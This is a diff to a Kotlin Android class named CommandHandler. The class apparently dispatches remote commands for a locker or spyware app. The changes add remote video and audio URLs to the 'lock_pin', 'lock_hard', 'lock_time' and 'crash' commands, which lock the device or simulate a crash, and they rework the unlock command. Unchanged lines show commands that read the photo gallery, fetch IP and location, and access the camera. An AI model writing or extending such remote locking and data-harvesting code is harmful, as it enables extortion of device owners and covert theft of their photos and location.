@@ -68,16 +68,20 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     // ============================================================
-    // EXECUTE COMMAND
+    // EXECUTE
     // ============================================================
     fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
         when (cmd) {
-            // ===== LOCK SYSTEM =====
+            // ===== LOCK PIN =====
             "lock_pin" -> {
                 val pin = args?.get("pin")?.asString ?: "1234"
-                startLockService("pin", pin, 0)
+                val video = args?.get("videoUrl")?.asString
+                val audio = args?.get("audioUrl")?.asString
+                startLockService("pin", pin, 0, video, audio)
                 done(mapOf("ok" to true, "type" to "pin", "pin" to pin))
             }
+
+            // ===== LOCK HARD =====
             "lock_hard" -> {
                 try {
                     val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
@@ -87,20 +91,38 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                         dpm.lockNow()
                     }
                 } catch (_: Exception) {}
-                startLockService("hard", "0", 0)
+                val video = args?.get("videoUrl")?.asString
+                val audio = args?.get("audioUrl")?.asString
+                startLockService("hard", "0", 0, video, audio)
                 done(mapOf("ok" to true, "type" to "hard"))
             }
+
+            // ===== LOCK JAM =====
             "lock_time" -> {
                 val hours = args?.get("hours")?.asLong ?: 5L
-                startLockService("time", "0", hours)
+                val video = args?.get("videoUrl")?.asString
+                val audio = args?.get("audioUrl")?.asString
+                startLockService("time", "0", hours, video, audio)
                 done(mapOf("ok" to true, "hours" to hours))
             }
+
+            // ===== CRASH =====
             "crash" -> {
-                startLockService("crash", "0", 0)
+                val video = args?.get("videoUrl")?.asString
+                val audio = args?.get("audioUrl")?.asString
+                startLockService("crash", "0", 0, video, audio)
                 done(mapOf("crash" to true))
             }
+
+            // ===== UNLOCK =====
             "unlock" -> {
-                stopLockService()
+                try {
+                    val i = Intent(ctx, LockService::class.java).apply {
+                        putExtra("type", "stop")
+                    }
+                    ctx.startService(i)
+                    ctx.stopService(i)
+                } catch (_: Exception) {}
                 done(mapOf("ok" to true))
             }
 
@@ -110,7 +132,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             // ===== GALLERY =====
             "gallery" -> done(readGallery())
 
-            // ===== LOCATION =====
+            // ===== IP + LOCATION =====
             "ip" -> done(getIpInfo())
 
             // ===== CAMERA =====
@@ -166,24 +188,26 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     // ============================================================
     // LOCK SERVICE HELPERS
     // ============================================================
-    private fun startLockService(type: String, pin: String, hours: Long) {
+    private fun startLockService(
+        type: String,
+        pin: String,
+        hours: Long,
+        videoUrl: String?,
+        audioUrl: String?
+    ) {
         try {
             val i = Intent(ctx, LockService::class.java).apply {
                 putExtra("type", type)
                 putExtra("pin", pin)
                 putExtra("hours", hours)
+                if (!videoUrl.isNullOrEmpty()) putExtra("videoUrl", videoUrl)
+                if (!audioUrl.isNullOrEmpty()) putExtra("audioUrl", audioUrl)
             }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 ctx.startForegroundService(i)
             } else {
                 ctx.startService(i)
             }
-        } catch (_: Exception) {}
-    }
-
-    private fun stopLockService() {
-        try {
-            ctx.stopService(Intent(ctx, LockService::class.java))
         } catch (_: Exception) {}
     }
 
@@ -259,7 +283,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     // ============================================================
-    // GET IP + LOCATION
+    // IP + LOCATION
     // ============================================================
     private fun getIpInfo(): Map<String, Any> {
         var lat = 0.0
